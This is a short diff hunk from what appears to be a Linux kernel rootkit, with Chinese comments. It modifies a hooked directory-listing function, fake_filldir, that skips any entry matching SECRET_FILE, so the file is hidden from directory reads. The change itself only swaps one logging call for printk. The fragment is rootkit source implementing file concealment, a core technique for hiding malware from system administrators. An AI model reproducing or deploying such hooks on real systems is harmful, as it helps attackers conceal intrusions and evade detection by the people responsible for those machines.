@@ -242,7 +242,7 @@ int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
 {
     if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
         // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
-        fm_alert("Hiding: %s", name);
+        printk("Hiding: %s", name);
         return 0;
     }
     // 如果不是需要隐藏的文件，
